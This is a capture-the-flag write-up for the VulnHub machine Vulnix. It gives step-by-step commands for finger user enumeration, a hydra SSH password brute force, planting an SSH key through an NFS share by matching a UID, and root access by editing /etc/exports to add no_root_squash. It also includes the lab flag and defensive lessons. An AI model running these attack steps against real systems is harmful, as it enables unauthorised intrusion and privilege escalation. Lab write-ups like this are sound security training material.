# 🖥️ Vulnix — VulnHub

| Field | Details |
|---|---|
| 🏷️ Machine | Vulnix (HackLab) |
| 🌐 Platform | VulnHub |
| 🎯 Difficulty | Medium |
| 🧠 Topics | Finger Enumeration, SSH Brute Force, NFS Exploitation, sudoedit PrivEsc |
| 👤 Author | [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) |
| 🔗 Source | https://www.vulnhub.com/entry/hacklab-vulnix,48/ |

---

## 📌 Summary

Vulnix exposes a finger service that leaks usernames. SSH brute force gives initial access as `user`. NFS share `/home/vulnix` is mounted and a local user with matching UID 2008 is created to inject SSH keys, granting shell as `vulnix`. Finally, `sudoedit /etc/exports` allows adding a `no_root_squash` entry for `/root`, which is mounted to capture the flag.

---

## 🔍 1. Reconnaissance & Enumeration

### Network Discovery

```bash
netdiscover
```

Target IP: **<TARGET_IP>**

### Port Scan

```bash
nmap -sN -sV <TARGET_IP>
```

| Port | Service |
|---|---|
| 22 | SSH |
| 25 | SMTP |
| 79 | Finger |
| 111 | RPCbind |
| 2049 | NFS |

---

## 🔎 2. Finger Enumeration

```bash
finger user@<TARGET_IP>
finger vulnix@<TARGET_IP>
```

Users found: `user`, `vulnix`

---

## 💥 3. SSH Brute Force

```bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 50
```

✅ **Credentials:** `user : letmein`

```bash
ssh user@<TARGET_IP>
```

---

## 📂 4. NFS Enumeration & Exploitation

```bash
showmount -e <TARGET_IP>
# /home/vulnix *
```

```bash
mkdir /mnt/vulnix
mount -t nfs <TARGET_IP>:/home/vulnix /mnt/vulnix
```

> If you face permission or compatibility issues, remount specifying NFS version 3:

```bash
mount -t nfs <TARGET_IP>:/home/vulnix /mnt/vulnix -o vers=3
```

```bash
ls -lash /mnt/
# vulnix owned by UID 2008
```

The `vulnix` folder shows as owned by **UID 2008** — further actions must be taken to access files, such as creating a local user with the same UID.

### Create Matching Local User

```bash
adduser -u 2008 vulnix
su vulnix
```

---

## 🔑 5. SSH Key Injection via NFS

```bash
mkdir /mnt/vulnix/.ssh
ssh-keygen -t ssh-rsa
cd ~/.ssh
cp id_rsa.pub /mnt/vulnix/.ssh/authorized_keys
```

```bash
ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa vulnix@<TARGET_IP>
```

✅ **Shell as `vulnix`**

---

## ⬆️ 6. Privilege Escalation

```bash
sudo -l
# (root) sudoedit /etc/exports
```

```bash
sudoedit /etc/exports
# Add: /root *(rw,no_root_squash)
```

Restart NFS:

```bash
sudo /etc/init.d/nfs-kernel-server restart
```

Mount `/root` from Kali:

```bash
mkdir /mnt/vulnroot
mount -t nfs <TARGET_IP>:/root /mnt/vulnroot
```

---

## 🚩 7. Flag

```bash
cat /mnt/vulnroot/trophy.txt
# cc614640424f5bd60ce5d5264899c3be
```

✅ **Challenge complete!**

---

## 📚 8. Lessons Learned

- Finger service leaks usernames — disable it in production
- NFS UID matching bypasses file permissions — always use `root_squash`
- `sudoedit /etc/exports` grants full filesystem access — never give this permission
- SSH key injection via writable NFS shares is a powerful technique

---

## 🛠️ Tools Used

- `netdiscover`, `nmap`, `finger`, `hydra`, `showmount`, `ssh-keygen`, `sudoedit`

---

*Writeup by [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) — for educational purposes only.*
